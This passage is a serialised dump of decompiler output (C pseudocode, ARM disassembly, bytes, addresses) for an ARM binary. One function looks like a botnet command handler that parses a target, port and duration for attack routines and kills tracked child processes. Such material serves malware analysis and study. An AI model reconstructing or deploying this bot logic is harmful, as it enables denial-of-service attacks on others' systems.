0x00008a4c\nldr r3,[r11,#-0x14]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p130
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n18 d0 4d e2\n18 00 0b e5\n1c 10 0b e5\n20 20 0b e5\n02 0b a0 e3\n33 fe ff eb\n00 30 a0 e1\n10 30 0b e5\n10 00 1b e5\n00 10 a0 e3\n02 2b a0 e3\n6f fe ff eb\n1c 00 1b e5\n8b fe ff eb\n00 30 a0 e1\n10 00 1b e5\n1c 10 1b e5\n03 20 a0 e1\n23 fe ff eb\n20 30 1b e5\n01 00 53 e3\n09 00 00 1a\n10 30 1b e5\n03 00 a0 e1\n80 fe ff eb\n00 30 a0 e1\n18 00 1b e5\n10 10 1b e5\n03 20 a0 e1\n01 39 a0 e3\n29 fe ff eb\n0f 00 00 ea\n10 30 1b e5\n03 00 a0 e1\n76 fe ff eb\n00 30 a0 e1\n18 00 1b e5\n10 10 1b e5\n03 20 a0 e1\n01 39 a0 e3\n1f fe ff eb\n00 30 a0 e1\n14 30 0b e5\n18 00 1b e5\n1c 10 9f e5\n02 20 a0 e3\n01 39 a0 e3\n18 fe ff eb\n14 30 1b e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p131
S'.text:0000911c\n.text:00009120\n.text:00009124\n.text:00009128\n.text:0000912c\n.text:00009130\n.text:00009134\n.text:00009138\n.text:0000913c\n.text:00009140\n.text:00009144\n.text:00009148\n.text:0000914c\n.text:00009150\n.text:00009154\n.text:00009158\n.text:0000915c\n.text:00009160\n.text:00009164\n.text:00009168\n.text:0000916c\n.text:00009170\n.text:00009174\n.text:00009178\n.text:0000917c\n.text:00009180\n.text:00009184\n.text:00009188\n.text:0000918c\n.text:00009190\n.text:00009194\n.text:00009198\n.text:0000919c\n.text:000091a0\n.text:000091a4\n.text:000091a8\n.text:000091ac\n.text:000091b0\n.text:000091b4\n.text:000091b8\n.text:000091bc\n.text:000091c0\n.text:000091c4\n.text:000091c8\n.text:000091cc\n.text:000091d0\n.text:000091d4\n.text:000091d8\n.text:000091dc\n.text:000091e0\n.text:000091e4\n.text:000091e8\n.text:000091ec\n.text:000091f0\n.text:000091f4\n.text:000091f8\n'
p132
tp133
sS'__errno_location'
p134
(S'\n__stdcall __errno_location()\n'
p135
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint * __errno_location(void)\u000a\u000a{\u000a  int *piVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b68. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  piVar1 = (int *)(*(code *)PTR_LAB_00014160)();\u000a  return piVar1;\u000a}\u000a\u000a
p136
S'adr r12,0x8b68\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5f8]!\n'
p137
S'00 c6 8f e2\n0b ca 8c e2\nf8 f5 bc e5\n'
p138
S'.plt:00008b60\n.plt:00008b64\n.plt:00008b68\n'
p139
tp140
sS'FUN_0000b928'
p141
(S'\n__stdcall FUN_0000b928()\n'
p142
V\u000avoid FUN_0000b928(byte bParm1)\u000a\u000a{\u000a  FUN_0000babc((uint)bParm1);\u000a  return;\u000a}\u000a\u000a
p143
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x10\ncpy r3,r0\nstrb r3,[r11,#-0x15]\nldrb r3,[r11,#-0x15]\nmov r3,r3, lsl #0x3\ncpy r2,r3\nldr r3,[0xb970]\nadd r3,r2,r3\nstr r3,[r11,#-0x10]\nldrb r3,[r11,#-0x15]\ncpy r0,r3\nbl 0x0000babc\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p144
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n10 d0 4d e2\n00 30 a0 e1\n15 30 4b e5\n15 30 5b e5\n83 31 a0 e1\n03 20 a0 e1\n1c 30 9f e5\n03 30 82 e0\n10 30 0b e5\n15 30 5b e5\n03 00 a0 e1\n55 00 00 eb\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p145
S'.text:0000b928\n.text:0000b92c\n.text:0000b930\n.text:0000b934\n.text:0000b938\n.text:0000b93c\n.text:0000b940\n.text:0000b944\n.text:0000b948\n.text:0000b94c\n.text:0000b950\n.text:0000b954\n.text:0000b958\n.text:0000b95c\n.text:0000b960\n.text:0000b964\n.text:0000b968\n.text:0000b96c\n'
p146
tp147
sS'FUN_000096f8'
p148
(S'\n__stdcall FUN_000096f8()\n'
p149
V\u000avoid FUN_000096f8(int iParm1,char **ppcParm2)\u000a\u000a{\u000a  uint uVar1;\u000a  int iVar2;\u000a  int iVar3;\u000a  int iVar4;\u000a  int iVar5;\u000a  char *pcVar6;\u000a  char *pcVar7;\u000a  int local_14;\u000a  \u000a  iVar2 = strcmp(*ppcParm2,PTR_DAT_00009c28);\u000a  if ((iVar2 == 0) && (2 < iParm1)) {\u000a    pcVar6 = ppcParm2[1];\u000a    iVar2 = atoi(ppcParm2[2]);\u000a    iVar3 = rand();\u000a    iVar4 = rand();\u000a    uVar1 = (uint)(iVar4 >> 0x1f) >> 0x17;\u000a    iVar5 = FUN_000095e8(ppcParm2[1]);\u000a    if (iVar5 == 0) {\u000a      FUN_0000a64c(pcVar6,iVar3 % 0xffdc,iVar2,(iVar4 + uVar1 & 0x1ff) - uVar1);\u000a                    /* WARNING: Subroutine does not return */\u000a      _exit(0);\u000a    }\u000a  }\u000a  iVar2 = strcmp(*ppcParm2,PTR_DAT_00009c2c);\u000a  if ((iVar2 == 0) && (4 < iParm1)) {\u000a    pcVar6 = ppcParm2[1];\u000a    iVar2 = atoi(ppcParm2[2]);\u000a    iVar3 = atoi(ppcParm2[3]);\u000a    iVar4 = atoi(ppcParm2[4]);\u000a    pcVar7 = ppcParm2[5];\u000a    iVar5 = FUN_000095e8(ppcParm2[1]);\u000a    if (iVar5 == 0) {\u000a      FUN_0000a7a4(pcVar6,iVar2,iVar3,iVar4,pcVar7);\u000a                    /* WARNING: Subroutine does not return */\u000a      _exit(0);\u000a    }\u000a  }\u000a  iVar2 = strcmp(*ppcParm2,PTR_DAT_00009c30);\u000a  if ((iVar2 == 0) && (4 < iParm1)) {\u000a    pcVar6 = ppcParm2[1];\u000a    iVar2 = atoi(ppcParm2[2]);\u000a    iVar3 = atoi(ppcParm2[3]);\u000a    iVar4 = atoi(ppcParm2[4]);\u000a    iVar5 = FUN_000095e8(ppcParm2[1]);\u000a    if (iVar5 == 0) {\u000a      FUN_0000ae00(pcVar6,iVar2,iVar3,iVar4);\u000a                    /* WARNING: Subroutine does not return */\u000a      _exit(0);\u000a    }\u000a  }\u000a  iVar2 = strcmp(*ppcParm2,PTR_DAT_00009c34);\u000a  if (iVar2 == 0) {\u000a    if (iParm1 < 2) {\u000a      local_14 = 0;\u000a      while (local_14 < 100) {\u000a        if (*(int *)(PTR_DAT_00009c38 + local_14 * 0x68) != 0) {\u000a          kill(*(__pid_t *)(PTR_DAT_00009c38 + local_14 * 0x68),9);\u000a          *(undefined4 *)(PTR_DAT_00009c38 + local_14 * 0x68) = 0;\u000a          memset(PTR_DAT_00009c38 + local_14 * 0x68 + 4,0,100);\u000a        }\u000a        local_14 = local_14 + 1;\u000a      }\u000a    }\u000a    else {\u000a      local_14 = 0;\u000a      while (local_14 < 100) {\u000a        if ((*(int *)(PTR_DAT_00009c38 + local_14 * 0x68) != 0) &&\u000a           (iVar2 = strcmp(PTR_DAT_00009c38 + local_14 * 0x68 + 4,ppcParm2[1]), iVar2 == 0)) {\u000a          kill(*(__pid_t *)(PTR_DAT_00009c38 + local_14 * 0x68),9);\u000a          *(undefined4 *)(PTR_DAT_00009c38 + local_14 * 0x68) = 0;\u000a          memset(PTR_DAT_00009c38 + local_14 * 0x68 + 4,0,100);\u000a        }\u000a        local_14 = local_14 + 1;\u000a      }\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p150
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x48\nstr r0,[r11,#-0x48]\nstr r1,[r11,#-0x4c]\nldr r3,[r11,#-0x4c]\nldr r3,[r3,#0x0]\ncpy r0,r3\nldr r1,[0x9c28]\nbl 0x00008b3c\ncpy r3,r0\ncmp r3,#0x0\nbne 0x00009810\nldr r3,[r11,#-0x48]\ncmp r3,#0x2\nble 0x00009810\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x4\nldr r3,[r3,#0x0]\nstr r3,[r11,#-0x44]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x8\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008b78\ncpy r3,r0\nstr r3,[r11,#-0x40]\nbl 0x00008aac\ncpy r1,r0\nmov r3,#0x120000\nadd r3,r3,#0x288\nadd r3,r3,#0x80000001\nsmull r2,r3,r1,r3\nadd r3,r3,r1\nmov r2,r3, asr #0xf\nmov r3,r1, asr #0x1f\nrsb r0,r3,r2\ncpy r3,r0\nmov r2,r3, lsl #0x3\nmov r3,r2, lsl #0xb\nrsb r3,r2,r3\nrsb r3,r0,r3\nmov r3,r3, lsl #0x2\nrsb r3,r3,r1\nstr r3,[r11,#-0x3c]\nbl 0x00008aac\ncpy r2,r0\nmov r3,r2, asr #0x1f\nmov r1,r3, lsr #0x17\nadd r3,r2,r1\nmov r3,r3, lsl #0x17\nmov r3,r3, lsr #0x17\nrsb r3,r1,r3\nstr r3,[r11,#-0x38]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x4\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x000095e8\ncpy r3,r0\ncmp r3,#0x0\nbne 0x00009810\nldr r0,[r11,#-0x44]\nldr r1,[r11,#-0x3c]\nldr r2,[r11,#-0x40]\nldr r3,[r11,#-0x38]\nbl 0x0000a64c\nmov r0,#0x0\nbl 0x00008b84\nldr r3,[r11,#-0x4c]\nldr r3,[r3,#0x0]\ncpy r0,r3\nldr r1,[0x9c2c]\nbl 0x00008b3c\ncpy r3,r0\ncmp r3,#0x0\nbne 0x000098f4\nldr r3,[r11,#-0x48]\ncmp r3,#0x4\nble 0x000098f4\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x4\nldr r3,[r3,#0x0]\nstr r3,[r11,#-0x34]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x8\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008b78\ncpy r3,r0\nstr r3,[r11,#-0x30]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0xc\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008b78\ncpy r3,r0\nstr r3,[r11,#-0x2c]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x10\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008b78\ncpy r3,r0\nstr r3,[r11,#-0x28]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x14\nldr r3,[r3,#0x0]\nstr r3,[r11,#-0x24]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x4\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x000095e8\ncpy r3,r0\ncmp r3,#0x0\nbne 0x000098f4\nldr r3,[r11,#-0x24]\nstr r3,[sp,#0x0]\nldr r0,[r11,#-0x34]\nldr r1,[r11,#-0x30]\nldr r2,[r11,#-0x2c]\nldr r3,[r11,#-0x28]\nbl 0x0000a7a4\nmov r0,#0x0\nbl 0x00008b84\nldr r3,[r11,#-0x4c]\nldr r3,[r3,#0x0]\ncpy r0,r3\nldr r1,[0x9c30]\nbl 0x00008b3c\ncpy r3,r0\ncmp r3,#0x0\nbne 0x000099c0\nldr r3,[r11,#-0x48]\ncmp r3,#0x4\nble 0x000099c0\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x4\nldr r3,[r3,#0x0]\nstr r3,[r11,#-0x20]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x8\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008b78\ncpy r3,r0\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0xc\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008b78\ncpy r3,r0\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x10\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008b78\ncpy r3,r0\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x4\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x000095e8\ncpy r3,r0\ncmp r3,#0x0\nbne 0x000099c0\nldr r0,[r11,#-0x20]\nldr r1,[r11,#-0x1c]\nldr r2,[r11,#-0x18]\nldr r3,[r11,#-0x14]\nbl 0x0000ae00\nmov r0,#0x0\nbl 0x00008b84\nldr r3,[r11,#-0x4c]\nldr r3,[r3,#0x0]\ncpy r0,r3\nldr r1,[0x9c34]\nbl 0x00008b3c\ncpy r3,r0\ncmp r3,#0x0\nbne 0x00009c1c\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x48]\ncmp r3,#0x1\nble 0x00009b30\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nb 0x00009b20\nldr r1,[r11,#-0x10]\nldr r0,[0x9c38]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r3,r3,r0\nldr r3,[r3,#0x0]\ncmp r3,#0x0\nbeq 0x00009b14\nldr r1,[r11,#-0x10]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r2,r3, lsl #0x3\nldr r3,[0x9c38]\nadd r3,r2,r3\nadd r2,r3,#0x4\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x4\nldr r3,[r3,#0x0]\ncpy r0,r2\ncpy r1,r3\nbl 0x00008b3c\ncpy r3,r0\ncmp r3,#0x0\nbne 0x00009b14\nldr r1,[r11,#-0x10]\nldr r0,[0x9c38]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r3,r3,r0\nldr r3,[r3,#0x0]\ncpy r0,r3\nmov r1,#0x9\nbl 0x00008a70\nldr r1,[r11,#-0x10]\nldr r0,[0x9c38]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r2,r3,r0\nmov r3,#0x0\nstr r3,[r2,#0x0]\nldr r1,[r11,#-0x10]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r2,r3, lsl #0x3\nldr r3,[0x9c38]\nadd r3,r2,r3\nadd r3,r3,#0x4\ncpy r0,r3\nmov r1,#0x0\nmov r2,#0x64\nbl 0x00008b18\nldr r3,[r11,#-0x10]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\ncmp r3,#0x63\nble 0x00009a00\nb 0x00009c1c\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nb 0x00009c10\nldr r1,[r11,#-0x10]\nldr r0,[0x9c38]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r3,r3,r0\nldr r3,[r3,#0x0]\ncmp r3,#0x0\nbeq 0x00009c04\nldr r1,[r11,#-0x10]\nldr r0,[0x9c38]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r3,r3,r0\nldr r3,[r3,#0x0]\ncpy r0,r3\nmov r1,#0x9\nbl 0x00008a70\nldr r1,[r11,#-0x10]\nldr r0,[0x9c38]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r3,r3, lsl #0x3\nadd r2,r3,r0\nmov r3,#0x0\nstr r3,[r2,#0x0]\nldr r1,[r11,#-0x10]\ncpy r3,r1\nmov r2,r3, lsl #0x2\nmov r3,r2, lsl #0x2\nrsb r3,r2,r3\nadd r3,r3,r1\nmov r2,r3, lsl #0x3\nldr r3,[0x9c38]\nadd r3,r2,r3\nadd r3,r3,#0x4\ncpy r0,r3\nmov r1,#0x0\nmov r2,#0x64\nbl 0x00008b18\nldr r3,[r11,#-0x10]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\ncmp r3,#0x63\nble 0x00009b3c\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p151
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n48 d0 4d e2\n48 00 0b e5\n4c 10 0b e5\n4c 30 1b e5\n00 30 93 e5\n03 00 a0 e1\n04 15 9f e5\n05 fd ff eb\n00 30 a0 e1\n00 00 53 e3\n37 00 00 1a\n48 30 1b e5\n02 00 53 e3\n34 00 00 da\n4c 30 1b e5\n04 30 83 e2\n00 30 93 e5\n44 30 0b e5\n4c 30 1b e5\n08 30 83 e2\n00 30 93 e5\n03 00 a0 e1\n05 fd ff eb\n00 30 a0 e1\n40 30 0b e5\ncf fc ff eb\n00 10 a0 e1\n12 38 a0 e3\na2 3f 83 e2\n06 31 83 e2\n91 23 c3 e0\n01 30 83 e0\nc3 27 a0 e1\nc1 3f a0 e1\n02 00 63 e0\n00 30 a0 e1\n83 21 a0 e1\n82 35 a0 e1\n03 30 62 e0\n03 30 60 e0\n03 31 a0 e1\n01 30 63 e0\n3c 30 0b e5\nbd fc ff eb\n00 20 a0 e1\nc2 3f a0 e1\na3 1b a0 e1\n01 30 82 e0\n83 3b a0 e1\na3 3b a0 e1\n03 30 61 e0\n38 30 0b e5\n4c 30 1b e5\n04 30 83 e2\n00 30 93 e5\n03 00 a0 e1\n7f ff ff eb\n00 30 a0 e1\n00 00 53 e3\n06 00 00 1a\n44 00 1b e5\n3c 10 1b e5\n40 20 1b e5\n38 30 1b e5\n90 03 00 eb\n00 00 a0 e3\ndc fc ff eb\n4c 30 1b e5\n00 30 93 e5\n03 00 a0 e1\n08 14 9f e5\nc5 fc ff eb\n00 30 a0 e1\n00 00 53 e3\n30 00 00 1a\n48 30 1b e5\n04 00 53 e3\n2d 00 00 da\n4c 30 1b e5\n04 30 83 e2\n00 30 93 e5\n34 30 0b e5\n4c 30 1b e5\n08 30 83 e2\n00 30 93 e5\n03 00 a0 e1\nc5 fc ff eb\n00 30 a0 e1\n30 30 0b e5\n4c 30 1b e5\n0c 30 83 e2\n00 30 93 e5\n03 00 a0 e1\nbe fc ff eb\n00 30 a0 e1\n2c 30 0b e5\n4c 30 1b e5\n10 30 83 e2\n00 30 93 e5\n03 00 a0 e1\nb7 fc ff eb\n00 30 a0 e1\n28 30 0b e5\n4c 30 1b e5\n14 30 83 e2\n00 30 93 e5\n24 30 0b e5\n4c 30 1b e5\n04 30 83 e2\n00 30 93 e5\n03 00 a0 e1\n48 ff ff eb\n00 30 a0 e1\n00 00 53 e3\n08 00 00 1a\n24 30 1b e5\n00 30 8d e5\n34 00 1b e5\n30 10 1b e5\n2c 20 1b e5\n28 30 1b e5\nad 03 00 eb\n00 00 a0 e3\na3 fc ff eb\n4c 30 1b e5\n00 30 93 e5\n03 00 a0 e1\n28 13 9f e5\n8c fc ff eb\n00 30 a0 e1\n00 00 53 e3\n2a 00 00 1a\n48 30 1b e5\n04 00 53 e3\n27 00 00 da\n4c 30 1b e5\n04 30 83 e2\n00 30 93 e5\n20 30 0b e5\n4c 30 1b e5\n08 30 83 e2\n00 30 93 e5\n03 00 a0 e1\n8c fc ff eb\n00 30 a0 e1\n1c 30 0b e5\n4c 30 1b e5\n0c 30 83 e2\n00 30 93 e5\n03 00 a0 e1\n85 fc ff eb\n00 30 a0 e1\n18 30 0b e5\n4c 30 1b e5\n10 30 83 e2\n00 30 93 e5\n03 00 a0 e1\n7e fc ff eb\n00 30 a0 e1\n14 30 0b e5\n4c 30 1b e5\n04 30 83 e2\n00 30 93 e5\n03 00 a0 e1\n13 ff ff eb\n00 30 a0 e1\n00 00 53 e3\n06 00 00 1a\n20 00 1b e5\n1c 10 1b e5\n18 20 1b e5\n14 30 1b e5\n11 05 00 eb\n00 00 a0 e3\n70 fc ff eb\n4c 30 1b e5\n00 30 93 e5\n03 00 a0 e1\n60 12 9f e5\n59 fc ff eb\n00 30 a0 e1\n00 00 53 e3\n8e 00 00 1a\n00 30 a0 e3\n10 30 0b e5\n48 30 1b e5\n01 00 53 e3\n4e 00 00 da\n00 30 a0 e3\n10 30 0b e5\n47 00 00 ea\n10 10 1b e5\n2c 02 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n00 30 83 e0\n00 30 93 e5\n00 00 53 e3\n38 00 00 0a\n10 10 1b e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 21 a0 e1\ne4 31 9f e5\n03 30 82 e0\n04 20 83 e2\n4c 30 1b e5\n04 30 83 e2\n00 30 93 e5\n02 00 a0 e1\n03 10 a0 e1\n32 fc ff eb\n00 30 a0 e1\n00 00 53 e3\n25 00 00 1a\n10 10 1b e5\nb0 01 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n00 30 83 e0\n00 30 93 e5\n03 00 a0 e1\n09 10 a0 e3\nef fb ff eb\n10 10 1b e5\n7c 01 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n00 20 83 e0\n00 30 a0 e3\n00 30 82 e5\n10 10 1b e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 21 a0 e1\n38 31 9f e5\n03 30 82 e0\n04 30 83 e2\n03 00 a0 e1\n00 10 a0 e3\n64 20 a0 e3\n00 fc ff eb\n10 30 1b e5\n01 30 83 e2\n10 30 0b e5\n10 30 1b e5\n63 00 53 e3\nb4 ff ff da\n3a 00 00 ea\n00 30 a0 e3\n10 30 0b e5\n34 00 00 ea\n10 10 1b e5\nf0 00 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n00 30 83 e0\n00 30 93 e5\n00 00 53 e3\n25 00 00 0a\n10 10 1b e5\nc0 00 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n00 30 83 e0\n00 30 93 e5\n03 00 a0 e1\n09 10 a0 e3\nb3 fb ff eb\n10 10 1b e5\n8c 00 9f e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 31 a0 e1\n00 20 83 e0\n00 30 a0 e3\n00 30 82 e5\n10 10 1b e5\n01 30 a0 e1\n03 21 a0 e1\n02 31 a0 e1\n03 30 62 e0\n01 30 83 e0\n83 21 a0 e1\n48 30 9f e5\n03 30 82 e0\n04 30 83 e2\n03 00 a0 e1\n00 10 a0 e3\n64 20 a0 e3\nc4 fb ff eb\n10 30 1b e5\n01 30 83 e2\n10 30 0b e5\n10 30 1b e5\n63 00 53 e3\nc7 ff ff da\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p152
S'.text:000096f8\n.text:000096fc\n.text:00009700\n.text:00009704\n.text:00009708\n.text:0000970c\n.text:00009710\n.text:00009714\n.text:00009718\n.text:0000971c\n.text:00009720\n.text:00009724\n.text:00009728\n.text:0000972c\n.text:00009730\n.text:00009734\n.text:00009738\n.text:0000973c\n.text:00009740\n.text:00009744\n.text:00009748\n.text:0000974c\n.text:00009750\n.text:00009754\n.text:00009758\n.text:0000975c\n.text:00009760\n.text:00009764\n.text:00009768\n.text:0000976c\n.text:00009770\n.text:00009774\n.text:00009778\n.text:0000977c\n.text:00009780\n.text:00009784\n.text:00009788\n.text:0000978c\n.text:00009790\n.text:00009794\n.text:00009798\n.text:0000979c\n.text:000097a0\n.text:000097a4\n.text:000097a8\n.text:000097ac\n.text:000097b0\n.text:000097b4\n.text:000097b8\n.text:000097bc\n.text:000097c0\n.text:000097c4\n.text:000097c8\n.text:000097cc\n.text:000097d0\n.text:000097d4\n.text:000097d8\n.text:000097dc\n.text:000097e0\n.text:000097e4\n.text:000097e8\n.text:000097ec\n.text:000097f0\n.text:000097f4\n.text:000097f8\n.text:000097fc\n.text:00009800\n.text:00009804\n.text:00009808\n.text:0000980c\n.text:00009810\n.text:00009814\n.text:00009818\n.text:0000981c\n.text:00009820\n.text:00009824\n.text:00009828\n.text:0000982c\n.text:00009830\n.text:00009834\n.text:00009838\n.text:0000983c\n.text:00009840\n.text:00009844\n.text:00009848\n.text:0000984c\n.text:00009850\n.text:00009854\n.text:00009858\n.text:0000985c\n.text:00009860\n.text:00009864\n.text:00009868\n.text:0000986c\n.text:00009870\n.text:00009874\n.text:00009878\n.text:0000987c\n.text:00009880\n.text:00009884\n.text:00009888\n.text:0000988c\n.text:00009890\n.text:00009894\n.text:00009898\n.text:0000989c\n.text:000098a0\n.text:000098a4\n.text:000098a8\n.text:000098ac\n.text:000098b0\n.text:000098b4\n.text:000098b8\n.text:000098bc\n.text:000098c0\n.text:000098c4\n.text:000098c8\n.text:000098cc\n.text:000098d0\n.text:000098d4\n.text:000098d8\n.text:000098dc\n.text:000098e0\n.text:000098e4\n.text:000098e8\n.text:000098ec\n.text:000098f0\n.text:000098f4\n.text:000098f8\n.text:000098fc\n.text:00009900\n.text:00009904\n.text:00009908\n.text:0000990c\n.text:00009910\n.text:00009914\n.text:00009918\n.text:0000991c\n.text:00009920\n.text:00009924\n.text:00009928\n.text:0000992c\n.text:00009930\n.text:00009934\n.text:00009938\n.text:0000993c\n.text:00009940\n.text:00009944\n.text:00009948\n.text:0000994c\n.text:00009950\n.text:00009954\n.text:00009958\n.text:0000995c\n.text:00009960\n.text:00009964\n.text:00009968\n.text:0000996c\n.text:00009970\n.text:00009974\n.text:00009978\n.text:0000997c\n.text:00009980\n.text:00009984\n.text:00009988\n.text:0000998c\n.text:00009990\n.text:00009994\n.text:00009998\n.text:0000999c\n.text:000099a0\n.text:000099a4\n.text:000099a8\n.text:000099ac\n.text:000099b0\n.text:000099b4\n.text:000099b8\n.text:000099bc\n.text:000099c0\n.text:000099c4\n.text:000099c8\n.text:000099cc\n.text:000099d0\n.text:000099d4\n.text:000099d8\n.text:000099dc\n.text:000099e0\n.text:000099e4\n.text:000099e8\n.text:000099ec\n.text:000099f0\n.text:000099f4\n.text:000099f8\n.text:000099fc\n.text:00009a00\n.text:00009a04\n.text:00009a08\n.text:00009a0c\n.text:00009a10\n.text:00009a14\n.text:00009a18\n.text:00009a1c\n.text:00009a20\n.text:00009a24\n.text:00009a28\n.text:00009a2c\n.text:00009a30\n.text:00009a34\n.text:00009a38\n.text:00009a3c\n.text:00009a40\n.text:00009a44\n.text:00009a48\n.text:00009a4c\n.text:00009a50\n.text:00009a54\n.text:00009a58\n.text:00009a5c\n.text:00009a60\n.text:00009a64\n.text:00009a68\n.text:00009a6c\n.text:00009a70\n.text:00009a74\n.text:00009a78\n.text:00009a7c\n.text:00009a80\n.text:00009a84\n.text:00009a88\n.text:00009a8c\n.text:00009a90\n.text:00009a94\n.text:00009a98\n.text:00009a9c\n.text:00009aa0\n.text:00009aa4\n.text:00009aa8\n.text:00009aac\n.text:00009ab0\n.text:00009ab4\n.text:00009ab8\n.text:00009abc\n.text:00009ac0\n.text:00009ac4\n.text:00009ac8\n.text:00009acc\n.text:00009ad0\n.text:00009ad4\n.text:00009ad8\n.text:00009adc\n.text:00009ae0\n.text:00009ae4\n.text:00009ae8\n.text:00009aec\n.text:00009af0\n.text:00009af4\n.text:00009af8\n.text:00009afc\n.text:00009b00\n.text:00009b04\n.text:00009b08\n.text:00009b0c\n.text:00009b10\n.text:00009b14\n.text:00009b18\n.text:00009b1c\n.text:00009b20\n.text:00009b24\n.text:00009b28\n.text:00009b2c\n.text:00009b30\n.text:00009b34\n.text:00009b38\n.text:00009b3c\n.text:00009b40\n.text:00009b44\n.text:00009b48\n.text:00009b4c\n.text:00009b50\n.text:00009b54\n.text:00009b58\n.text:00009b5c\n.text:00009b60\n.text:00009b64\n.text:00009b68\n.text:00009b6c\n.text:00009b70\n.text:00009b74\n.text:00009b78\n.text:00009b7c\n.text:00009b80\n.text:00009b84\n.text:00009b88\n.text:00009b8c\n.text:00009b90\n.text:00009b94\n.text:00009b98\n.text:00009b9c\n.text:00009ba0\n.text:00009ba4\n.text:00009ba8\n.text:00009bac\n.text:00009bb0\n.text:00009bb4\n.text:00009bb8\n.text:00009bbc\n.text:00009bc0\n.text:00009bc4\n.text:00009bc8\n.text:00009bcc\n.text:00009bd0\n.text:00009bd4\n.text:00009bd8\n.text:00009bdc\n.text:00009be0\n.text:00009be4\n.text:00009be8\n.text:00009bec\n.text:00009bf0\n.text:00009bf4\n.text:00009bf8\n.text:00009bfc\n.t